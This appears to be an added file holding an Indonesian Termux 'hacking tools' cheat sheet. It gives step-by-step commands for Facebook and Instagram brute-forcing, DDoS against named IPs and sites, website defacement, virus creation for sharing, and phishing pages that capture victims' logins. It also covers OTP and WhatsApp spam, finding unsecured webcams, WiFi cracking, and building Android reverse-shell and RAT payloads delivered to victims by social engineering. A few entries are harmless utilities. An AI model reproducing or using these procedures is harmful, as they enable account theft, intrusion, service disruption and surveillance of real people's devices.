@@ -1,0 +1,901 @@
+Hacking
+FAKE CALL
+$ pkg update && pkg upgrade -y
+$ pkg install toilet
+$ pkg install openssh
+$ pkg install php
+$ pkg install nodejs
+$ pkg install nodejs-lts
+$ pkg install python python2
+$ pkg install python2-dev
+$ pkg install git
+$ pkg install curl
+$ pkg install figlet
+$ pkg install ruby
+$ gem install lolcat
+$ git clone https://github.com/T14RB373T/FAKECALL
+$ cd FAKECALL
+$ bash call.sh
+$ 1 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Hacked FB.
+$ pkg update && pkg upgrade -y
+$ pkg install python2
+$ pkg install git
+$ git clone https://github.com/rezadkim/MBFz
+$ cd MBFz
+$ pip2 install -r nganunymous.txt
+$ pip2 install mechanize
+$ pip2 install progress
+$ python2 mbfz.py
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Cara hack ig 
+$ pkg update
+$ pkg upgrade
+$ pkg install git 
+$ pkg install python python2
+$ git clone https://github.com/linuxkukeren/instagram
+$ cd instagram
+$ pip install -r requirements.txt
+$ pip2 install -r requirements.txt
+$ python2 linuxkerenhackig.py (nama target) pass.txt
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Hack Instagram lagi 
+Ok gan nih kode atau kata perintahnya : 
+$ pkg update 
+$ pkg upgrade 
+$ pkg install git 
+$ pkg install nano 
+$ pkg install cowsay 
+$ pkg install figlet 
+$ pkg install python2 
+$ gem install lolcat 
+$ git clone https://github.com/DarkCurut08/DarkCurut08
+$ cd DarkCurut08 
+$ chmod +x Moreno777.sh
+$ sh Moreno77.sh
+Jangan Lupa Install Bahan Dlu Di No 8
+
+Termux commands (root)
+$ apt update 
+$ apt upgarde 
+$ apt install git 
+$ git clone https://github.com/thelinuxchoice/instainsane
+$ ls 
+$ cd instainsane 
+$ ls 
+$ chmod +x * 
+$ ls
+$ ./install.sh
+$ ./instainsane.sh
+Enter user name Now start brute force attack 
+
+
+Semoga Bermanfaat 
+Hacked FB.
+$ pkg update && pkg upgrade -y
+$ pkg install python2
+$ pkg install git
+$ git clone https://github.com/rezadkim/MBFz
+$ cd MBFz
+$ pip2 install -r nganunymous.txt
+$ pip2 install mechanize
+$ pip2 install progress
+$ python2 mbfz.py
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Cara hack ig 
+$ pkg update
+$ pkg upgrade
+$ pkg install git 
+$ pkg install python python2
+$ git clone https://github.com/linuxkukeren/instagram
+$ cd instagram
+$ pip install -r requirements.txt
+$ pip2 install -r requirements.txt
+$ python2 linuxkerenhackig.py (nama target) pass.txt
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Hack Instagram lagi 
+Ok gan nih kode atau kata perintahnya : 
+$ pkg update 
+$ pkg upgrade 
+$ pkg install git
+$ pkg install nano 
+$ pkg install cowsay 
+$ pkg install figlet 
+$ pkg install python2 
+$ gem install lolcat 
+$ git clone https://github.com/DarkCurut08/DarkCurut08
+$ cd DarkCurut08 
+$ chmod +x Moreno777.sh
+$ sh Moreno77.sh
+Jangan Lupa Install Bahan Dlu Di No 8
+
+(1) MBF TOOLS 
+$ pkg update (enter) 
+$ pkg upgrade (enter) 
+$ pkg install python2 (enter) 
+$ pip2 install mechanize (enter) 
+$ pkg install git (enter) 
+$ git clone https://github.com/pirmansx/mbf (enter) 
+$ ls (enter) 
+$ cd mbf (enter) 
+$ ls (enter) 
+$ chmod +x MBF.py (enter) 
+$ ls (enter) 
+$ python2 MBF.py (enter) 
+isi formulir yang di berikan 
+
+
+
+(2) HAMMER 
+$ pkg update (enter) 
+$ pkg upgrade (enter) 
+$ pkg install python (enter) 
+$ pkg install git (enter) 
+$ git clone https://github.com/cyweb/hammer (enter) 
+$ cd hammer (enter) 
+$ ls (enter) 
+$ python hammer.py (enter) 
+$ python hammer.py -s (nomor IP target) -p 80 -t 135 (enter) 
+
+
+
+(3) DEFACE WEBDAV 
+$ pkg update (enter) 
+$ pkg upgrade (enter) 
+$ pkg install wget (enter) 
+$ pkg install python2 (enter) 
+$ pip2 install urllib3 chardet certifi idna request (enter) 
+$ pkg install openssl curl (enter) 
+$ pkg install libcurl (enter) 
+$ mkdir webdav (enter) 
+$ cd webdav (enter) 
+$ wget https://pastebin.com/raw/HnVyQPtR (enter) 
+$ mv HnVyQPtR webdav.py (enter) 
+$ cd /sdcard (enter) 
+$ cp (nama script kalian) $HOME/webdav (enter) 
+$ cd (enter) 
+$ cd webdav (enter) 
+$ python2 webdav.py (web target) (script kalian) (enter) 
+
+
+
+(4) VIRUS VBUG 
+download file http://upfile.mobi/YGwg8gQLuvv 
+$ pkg update (enter) 
+$ pkg upgrade (enter) 
+$ cd /storage/emulated/0 (enter) 
+$ ls (enter) 
+$ cp -f vbug.zip $HOME (enter) 
+$ cd $HOME (enter) 
+$ ls (enter) 
+$ unzip vbug.zip (enter) 
+$ ls (enter) 
+$ cd vbug (enter) 
+$ python2 vbug.py (enter) 
+pilih virus mana yang di sukai.. asalkan jangan virus HIV :v 
+save file virus 
+$ cp -f (nama virus yang kalian pilih) /storage/emulated/0 (enter) 
+cari dan share :v 
+
+
+
+(5) BAJINGAN TOOLS V4 
+$ pkg update (enter) 
+$ pkg upgrade (enter) 
+$ pkg install git (enter) 
+$ git clone http://github.com/DarknessCyberTeam/B4J1N64Nv4 (enter) 
+$ ls (enter) 
+$ cd B4J1N6ANv4 (enter) 
+$ ls (enter) 
+$ sh bajingan.sh (enter) 
+nah disitu udah banyak kumpulan toolsnya tinggal di pake :v 
+
+
+
+(6) SPAM TERMUX 
+$ apt upgrade && apt update (enter) 
+$ apt install git (enter) 
+$ git clone https://github.com/mrmsdv/sdvspam.git (enter) 
+$ cd sdvspam (enter) 
+$ sh install.sh (enter) 
+$ sh sdv.sh (enter) 
+
+
+
+(7) HACK FACEBOOK 
+$ apt upgrade && apt update (enter) 
+$ apt install git (enter) 
+$ git clone https://github.com/mrmsdv/fbbrute.git (enter) 
+$ cd fbbrute (enter) 
+$ python2 fb.py (enter) 
+$ masukan email atau id fb (enter) 
+$ wl.txt (enter) 
+
+
+
+(8) PERKIRAAN CUACA 
+$ pkg install curl (enter) 
+$ curl http://wttr.in/ (lokasi) (enter) 
+
+
+
+(9) LITE SPAM 
+$ pkg install git (enter) 
+$ git clone https://github.com/4L13199/LITESPAM (enter) 
+$ cd LITESPAM (enter) 
+$ sh LITESPAM.sh (enter) 
+
+
+
+(10) WEEMAN 
+$ apt-get update (enter) 
+$ apt-get upgrade (enter) 
+$ pkg install python2 (enter) 
+$ pkg install git (enter) 
+$ git clone https://github.com/evait-security/weeman.git (enter) 
+$ ls (enter) 
+$ cd weeman (enter) 
+$ ls (enter) 
+$ python2 weeman.py (enter) 
+$ show (enter) 
+$ set url https://www.facebook.com (enter) 
+$ set action_url https://www.facebook.com (enter) 
+$ show (enter) buka new season (new tab) /lembar ke 2 
+$ ifconfig (enter) 
+jika slesai copy no addres yg tertera. jngn sampai salah karna ada 2 addres disitu. jika tdk tau yg mna tanya. stelah copy no adres. buka lembar pertama lagi tulis 
+$ run (enter) 
+kasih adres tdi ke target. contoh 125.25.175.88:8080 ingt hrus ksh port > :8080 jika sudah dibuka dngn dia. saat dia login nnti. email. pass. tertera. serta data" akun target.... 
+
+
+
+(11) RUBAH TAMPILAN AWAL TERMUX 
+$ pkg install vim (enter) 
+$ pkg install ruby (enter) 
+$ gem install lolcat (enter) 
+$ pkg install cowsay (enter) 
+$ pkg install toilet (enter) 
+$ pkg install neofetch (enter) 
+$ pkg install figlet (enter) 
+$ vim /data/data/com.termux/files/usr/etc/profile (enter) 
+Tekan huruf "i" untuk ngedit teks Copy script dibawah ini lalu paste di profil Salin script perintah : clear echo echo cowsay -f eyes WELCOME TO TERMUX Tn_B43UT| lolcat echo toilet -f standard -F gay "Mr_XxXx" echo neofetch echo -e '\033[01;32m' date echo -e '\033[01;32m' bisa diganti dengan nama Anda Munculkan ESC dengan cara tekan Vol up + Q secara bersamaan lalu simpan scripts di atas tadi yang sudah di edit dengan cara tekan ESC lalu tulis :wq lalu Enter jika sudah
+
+(12) TOOLS STRIKER 
+$ apt update (enter) 
+$ apt upgrade (enter) 
+$ pkg install git (enter) 
+$ pkg install python2 (enter) 
+$ git clone https://github.com/UltimateHackers/Striker (enter) 
+$ cd Striker (enter) 
+$ pip2 install -r requirements.txt (enter) 
+$ python2 striker.py (enter) 
+download dulu ngrok nya di google..terus login di ngrok dashboard(password akun kamu minimal harus 10 karakter).stlh itu pindah di penyimpanan internal... 
+
+
+
+(13) INSTAL NGROK 
+$ apt update 
+$ apt upgrade 
+$ cd /storage/emulated/0/ 
+$ mv -v /storage/emulated/0/ngrok $HOME 
+$ ls 
+$ chmod 777 ngrok 
+$ ./ngrok 
+$ ./ngrok authtoken (copy di ngrok dashboard) 
+$ ./ngrok http 80 (copy di ngrok dashboard) Dan Selesai...!!!Sudah Ngrok nya dah di install 
+
+
+
+(14) HACK CCTV 
+Pertama daftar klik Pilih aja Gogle Setelah login klik tulisan my account Pingirnya ijo" Pastikan browser kalian tetap disana 1.cd metasploit-framework 
+2../msfconsole 
+3.use auxiliary/gather/shodan_search Kalian copy tulisan yg tdk beraturan di browser kalian lalu tempel di termux DG set SHODAN_APIKEY blablabla 
+4.set SHODAN_APIKEY blablabla 
+5.set query "webcamxp" 
+Kemudian jalankan DG Ketik run 6.run 
+Untuk melihat kalian copy IP yg ada dikiri Lalu kalian tempel di browser cari yg tdk ada keamananya SELAMAT MENCOBA 
+
+
+
+(15) INSTAL METASPLOIT 
+$ pkg update && pkg upgrade 
+$ pkg install curl 
+$ pkg install python 
+$ pkg install python2 
+$ curl -LO klik 
+$ ls 
+$ chmod 777 metasploitTechzindia.sh 
+$ ./metasploitTechzindia.sh — ( Tunggu 5 – 10 menit ) 
+$ ls 
+$ cd metasploit-framework 
+$ ./msfconsole 
+
+
+
+(16) INSTAL OSIF 
+$ apt update 
+$ apt upgrade 
+$ apt install python2 
+$ pip2 install requests mechanize 
+$ apt install git 
+$ git clone klik 
+$ cd OSIF 
+$ pip2 install -r requirements.txt 
+$ python2 osif.py 
+$ token 
+$ isi username dan pass fb anda 
+$ help 
+$ bot 
+pilih bot terserah anda 
+
+
+
+(17) SCRIPT DEFACE 
+$ apt update 
+$ apt upgrade 
+$ apt install python2 
+$ apt install git 
+$ git clone klik 
+$ ls 
+$ cd script-deface-creator 
+$ ls 
+$ chmod +x create.py 
+$ ls 
+$ python2 create.py 
+
+
+
+(18) LAZYMUX 
+$ apt update 
+$ apt install git 
+$ apt install python 
+$ apt install python2 
+$ git clone klik 
+$ cd Lazymux 
+$ python2 lazymux.py 
+
+
+
+(19) TOOLS BAJINGANV5 
+$ pkg install update 
+$ pkg install git 
+$ pkg install toilet 
+$ pkg install figlet 
+$ pip2 install lolcat 
+$ git clone klik 
+$ cd B4J1N64Nv5 
+$ sh B4J1N64N.sh 
+
+
+
+(20) INSTAL NETHUNTER 
+$ apt update 
+$ apt install git 
+$ git clone klik 
+$ cd Nethunter 
+$ Is 
+$ chmod +x kalinethunter 
+$ ./kalinethunter 
+$ ./startkali.sh 
+
+
+
+(21) SPAM OTP 
+$ git clone klik 
+$ ls 
+$ cd LiteOTP 
+$ chmod 777 lite.php 
+$php lite.php 
+$ php lite.php (input no.korban) 
+
+
+
+(22) HUNNER 
+$ apt update 
+$ apt install python 
+$ apt install git -y 
+$ git clone klik 
+$ cd Hunner 
+$ chmod 777 hunner.py 
+$ python hunner.py 
+
+
+
+(23) BLACK HYDRA 
+$ apt update && apt upgrade 
+$ apt install git 
+$ git clone klik 
+$ cd b-hydra 
+$ mv blackhydra.py main.py 
+$ chmod +x main.py 
+$ python2 main.py 
+
+
+
+(24) BRUTEFORCE 
+$ apt update 
+$ apt upgrade 
+$ apt install python2 
+$ apt install python2-dev 
+$ apt install wget 
+$ pip2 install mechanize 
+$ cd/storage/emulated/0 
+$ python2 fbbrute.py 
+$ storage/emulated/0/password.txt 
+
+
+
+(25) SCANNER-INURLBR 
+$ apt update 
+$ apt upgrade 
+$ pkg install php 
+$ pkg install git $ git clone klik 
+$ cd SCANNER-INURLBR 
+$ php inurlbr.php 
+
+
+
+(26) SOCIAL FISH 
+$ php inurlbr.php -h 
+$ apt update 
+$ apt upgrade 
+$ pkg install git 
+$ pkg install python2 
+$ pkg install php 
+$ git clone klik 
+$ cd SocialFish 
+$ pip install -r requirements.txt 
+$ python2 SocialFish.py 
+
+
+
+(27) TOOLS SANTET 
+$ pkg update 
+$ pkg upgrade 
+$ pkg install python2 
+$ pkg install git 
+$ git clone klik 
+$ ls 
+$ cd santet-online 
+$ ls 
+$ python2 santet.py 
+
+
+
+(28) TOOLS MR.CAKIL 
+$ apt update && apt upgrade 
+$ pkg install git 
+$ git clone klik 
+$ cd Mrcakil 
+$ chmod +x tools 
+$ ./tools 
+
+
+
+(29) HACK WIFI ROOT 
+Ini cara mudah disederhanakan. 
+1) gunakan dulu jaringan hp + buka wifi, cari tempat yang wifi nya cepat + masih di password. 
+2) buka termux. 
+3) apt update + apt upgrade 
+4) pkg install git 
+5) git clone klik 
+6) cd wifi-hacker/ 
+7) chmod +x wifi-hacker.sh 
+8) ./wifi-hacker.sh 
+9) pilih y tunggu 10 detik lalu pilih 2 
+10) buka menu wifi di hp. Tutup terus buka lagi. Otomatis terhubung. 
+11) bobol wifi, bisa connect tapi kita tetap gak tau pw. Yang penting bisa wifian gratis. 
+
+
+
+(30) MENGETAHUI MEREK HP ORANG LAIN 
+Pastikan kalian udah install ngrok dan metasploit 
+*Buka ngrok :* 
+$ ./ngrok http 6969 (bebas 4 angka) 
+*Buka metasploit/halaman baru* 
+$ msfconsole 
+$ use exploit/android/browser/stagefright_mp4_tx3g_64bit.rb 
+$ set lhost 127.0.0.1 
+$ set srvhost 127.0.0.1 
+$ set lport 6969 
+$ set srvport 6969 
+$ set uripath hackinstagram 
+$ run 
+Kembali ke ngrok dan salin linknya dan tambah uripathnya 
+Contoh https://blablabla.ngrok.io/hackinstagram 
+Ada berbagai macam Tool di dalam nya 
+
+
+
+(31) TOOLS CREWBOT 
+$ apt update 
+$ apt upgrade 
+$ pkg install 
+$ git clone klik 
+$ ls 
+$ cd CrewBot 
+$ python2 CrewBot.pyc 
+
+
+
+(32) CARA GENERATE KK/KTP 
+$ git clone klik 
+$ ls 
+$ cd ktpkkgenerate 
+$ ls 
+$ php zerosvn.php 
+
+
+
+(33) LITE DDOS 
+$ pkg install python2 
+$ pkg install git 
+$ git clone https://github.com/4L13199/LITEDDOS 
+$ cd LITEDDOS/ 
+$ python2 LITEDDOS.py 
+$ python2 LITEDDOS.py 147.237.76.155 80 100|lolcat 
+
+
+
+(34) CARA REMOTE HP ORANG LAIN 
+harus punya metasploit dulu 
+$ ls 
+$ cd metasploit-framework 
+$ ls 
+$ ruby msfvenom -p android/meterpreter/reverse_tcp LHOST=10.32.140.70 LPORT=4444 R> /sdcard/HackTools.APK 
+TUNGGU PROSES PEMBUATAN APK SELESAI 
+$ ./msfconsole (TUNGGU PROSES PENGHIDUPAN METASPLOIT) 
+$ use exploit/multi/handler 
+$ set payload android/meterpreter/reverse_tcp 
+$ set lhost 10.32.140.70 
+$ set lport 4444 
+$ exploit 
+Share Apknya Klo apk keinstall Trus Di Buka Maka Bisa kita Sadap 
+
+
+
+(35) TOOLS BAJINGAN V6 
+$ pkg install git 
+$ git clone klik 
+$ ls 
+$ cd BAJINGANv6 
+$ sh BAJINGAN.sh 
+Username: BAJINGAN 
+Password: Gans 
+
+
+
+(36) RECONDOG 
+$ apt update 
+$ apt install python python2 
+$ apt install git 
+$ git clone klik 
+$ cd ReconDog 
+$ chmod +x dog.py 
+$ Python2 dog.py 
+
+
+
+(37) TOOLS UBUNTU 
+$ apt update 
+$ apt install git 
+$ apt install wget 
+$ apt install proot 
+$ git clone klik 
+$ cd termux-ubuntu 
+$ chmod +x ubuntu.sh 
+$ ./ubuntu.sh 
+$ ./start.sh 
+
+
+
+(38) IPGeolocation 
+$ git clone klik 
+$ cd IPGeolocation 
+$ chmod +x ipgeolocation.py 
+$ pip install -r requirements.txt 
+$ python ipgeolocation.py -m 
+$ python ipgeolocation.py -t IP yang ingin dilacak 
+
+
+
+(39) TOOLS MR.Rv1.1 
+$ apt update && apt upgrade 
+$ pkg install git 
+$ pkg install gem 
+$ pkg install figlet 
+$ gem install lolcat 
+$ git clone klik 
+$ cd Mr.Rv1.1 
+$ sh Mr.Rv1.1.sh 
+
+
+
+(40) INSTALL D-TECT 
+$ apt install git 
+$ apt install python2 
+$ git clone klik 
+$ ls 
+$ cd D-TECH 
+$ chmod +x d-tect.py 
+$ python2 d-tect.py 
+
+
+
+(41) TOOLS LENGKAP 
+$ pkg update 
+$ apt install git python python2 
+$ git clone klik 
+$ ls 
+$ cd Tool-X 
+$ ls 
+$ chmod +x install.aex 
+$ clear 
+$ ./install.aex 
+$ y 
+$ Tool-X 
+$ 3 
+$ 00 
+$ 1 
+
+
+
+(42) KATOOLIN 
+$ pkg update 
+$ pkg upgrade 
+$ pkg install git 
+$ pkg install python2 
+$ pkg install nano 
+$ pkg install gnupg 
+$ git clone klik 
+$ ls 
+$ cd katoolin 
+$ ls 
+$ python2 katoolin.py 
+$ nano katoolin.py 
+
+
+
+(43) TORSHAMMER 
+$ pkg update 
+$ pkg install git 
+$ Pkg install tor 
+$ pkg install python2 
+$ git clone klik 
+$ ls 
+$ cd torshammer 
+$ python2 torshammer.py -T -t seword.com (web yang kalian attack) 
+
+
+
+(44) BOT KOMENA FB 
+$ pkg update && pkg upgrade 
+$ pkg install git 
+$ pkg install python2 
+$ pip2 install mechanize 
+$ git clone klik 
+$ cd Botkomena 
+$ python2 botkomena.py 
+
+
+
+(45) CHATTING DI TERMUX 
+$ pkg install irssi 
+$ irssi 
+$ /connect chat.freenode.net 
+$ nick abcdef 
+abcdef diganti menjadi nama kalian atau sesuka hati 
+$ join #ke alamat chatting yang mau dituju 
+misalnya F4H 
+
+
+
+(46) BROWSING DI TERMUX 	
+	$ pkg install w3m 	
+	$ w3m www.google.com 	
+	
+	
+
+(47) MENAMPILKAN SYSTEM ANDROID 	
+	$ pkg install neofetch 	
+	$ neofecth 	
+	
+	
+	
+	(48) MEMUTAR MUSIC YOUTUBE VIA TERMUX 
+$ pkg install python 
+$ pip install mps_youtube 
+$ pip install youtube_dl 
+$ apt install mpv 
+$ mpsyt 
+$ /judul lagu 
+tinggal pilih lagu dengan mengetik nomornya 
+
+
+
+(49) BOBOL WIFI ROOT 	
+	$ pkg update 	
+	$ pkg upgrade 	
+	$ pkg install git 	
+	$ git clone https://github.com/esc0rtd3w/wifi-hacker 	
+	$ cd wifi-hacker 	
+	$ chmod +x wifi-hacker.sh 	
+	$ ./wifi-hacker.sh 	
+	 {1} pilih Y tunggu 10 detik lalu pilih 2 	
+{2} buka menu wifi di hp... tutup terus buka lagi otomatis terhubung 
+Inget.. harus akses root 
+ini hanya untuk menghubungkan saja, tapi tetep ga bisa liat passwordnya 
+
+
+
+(50) CARA MERETAS ANDROID MENGGUNAKAN A_RAT 	
+	pertamatama buka dulu termux kalian.. dan masukin perintah 	
+	$ ./ngrok tcp (port yang lo mau) contoh = ./ngrok tcp 1337 	
+	kedua kita bikin halam baru termux.. dan buka tools A-rat 	
+	kemudian kita bikin payloadnya dengan perintah berikut.. 	
+	$ set HOST 0.tcp.ngrok.io 	
+	$ set PORT (portnya yang ada di menu ngrok) 	
+	Disini gua muncul port 15497.. jadi commandnya 	
+	$ set PORT 15497 	
+	$ set OUTPUT /sdcard/(nama payload yang lo mau).py 	
+	contoh = set OUTPUT /sdcard/idiotlu.py 	
+$ generate 
+$ set HOST 127.0.0.1 
+$ set PORT (port yang lo forwadin) 
+contoh = set PORT 1337 
+$ run 
+setelah selesai bikin payload tadi, sekarang kamu kirim & socengin orang orang biar mau di jalanin payload yang kamu bikin.. kalo ada yang orang yang jalanin payload yang lo bikin maka ada tulisan "A-rat@127.0.0.1:-#" setelah itu.. terserah kalian mau ngapain android korban yang udah kena A-rat dari kalian..disini saya ingin mengecek info kernel hp korban dengan perintah 
+kernel_info 
+untuk perintah lainnya.. kalian bisa klik perintah berikut.. 
+help 
+oke sekian dari saya.. yang ingin bertanya silahkan chat di grup whatshap 
+
+
+
+(51) DDOS XERXES 	
+	$ pkg update 	
+	$ pkg upgrade 	
+	$ pkg install git 	
+	$ git clone klik 	
+	$ cd xerxes 	
+	$ clang xerxes.c -o xerxes 	
+	$ ./xerxes (website) 80 	
+	
+	
+	
+	(52) HAKKU 		
+		$ pkg install python 		
+		$ pkg install git 		
+		$ mkdir vasu 		
+		$ git clone klik 		
+		$ chmod +x hakku 		
+		$ python hakku 		
+		$ show modules 		
+		$ use whois 		
+		$ show options 		
+		$ set target techicalsagar.in 		
+		$ run 		
+		
+		
+		
+		(53) BERMAIN MOON-BUGGY 			
+			$ pkg update 			
+			$ pkg upgrade 			
+			$ moon-buggy 			
+			
+			
+			
+			(54) TELPHONE 				
+				$ pkg install termux-api 				
+				$ termux-telephony-call (nomornya) 				
+				
+				
+				
+				(55) MENAMPILKAN ANIMASI KERETA 					
+					$ pkg install sl 					
+					$ sl 					
+					
+					
+					
+					(56) TOOLS INSTALL 						
+						$ pkg install git 						
+						$ git clone klik 						
+						$ cd 4wsectools 						
+						$ chmod 777 tools 						
+						$ ./tools
+
+~TERMUX TUTOR HACK TOOLS ~
+
+1)  #INstall Metasploit
+$pkg update
+$pkg install wget
+$wget https://5hady.github.io/metasploit.sh
+$ls
+$bash metasploit.sh
+$msfconsole
+=======================================
+2)  #TUTOR HACK CCTV/
+$apt update && apt upgrade 
+$pkg install python2 
+$pkg install git 
+$pip2 install requests 
+$git clone https://github.com/kancotdiq/ipcs
+$cd ipcs
+$python2 ipcs.py
+=======================================
+3)  #Hack CCTV with METASPLOIT 
+Pertama daftar
+Https://www.shodan.io
+Pilih aja Gogle
+Setelah login klik tulisan my account
+Pingirnya ijo"
+Pastikan browser kalian tetap disana
+1.cd metasploit-framework
+2../msfconsole
+3.use auxiliary/gather/shodan_search
+Kalian copy tulisan yg tdk beraturan di browser kalian lalu tempel di termux DG set SHODAN_APIKEY blablabla
+4.set SHODAN_APIKEY blablabla
+5.set query "webcamxp"
+Kemudian jalankan DG Ketik run
+6.run
+=======================================
+4)  #Spam WA/CALL Tokped&Bukalapak
+1. apt update -y
+2. apt upgrade -y
+3. apt install git
+4. apt install php
+5. git clone https://github.com/siputra12/prank
+6. cd prank
+7. ls
+8. php call.php
+9. php wa.php
+=======================================
+5)  #Crack FBbrute
+$apt install python2-y
+$apt install python2-y
+$apt install python2-dev
+$pip2 install mechanize
+$apt instal git
+$git clone https://github.com/Senitopeng/fbbrute
+$cd fbbrute 
+$python2 jomblo.py
+=======================================
+6)  #Crack Fb Masal
+$apt update && apt upgrade
+$pkg install python2
+$pkg install git
+$git clone https://github.com/hnov7/mbf
+$pip2 install mechanize
+$cd mbf
+$python2 mbf.py
+=======================================
+7)  #Nuyul Kubik-1
+$pkg install git
+$pkg install php
+$pkg install nano
+$git clone https://github.com/adidoank/kubik
+$cd kubik
+$nano cfg.php
+=======================================
+8)  #Nuyul KUBIK - 2
+$apt update & & apt upgrade 
+$apt install git 
+$apt install php 
+$apt install nano 
+$git clone https://github.com/segi3channel/guludug
+$cd guludug
+$ls
+$nano cfg.php
+#ubah semua data kubikx,,,,,,dengan apk ssl capture 
+Disitu kalian ubah yaaa
+Klau sdah di ubah semua kalian ketik:
+$php bot.php
+=======================================
+9)  #*CHATTING DI TERMUX*
+$ pkg install irssi
+$ irssi
+$ /connect chat.freenode.net
+$ /nick abcdef
+Abcdef di ganti s
+
+By Ekaputra
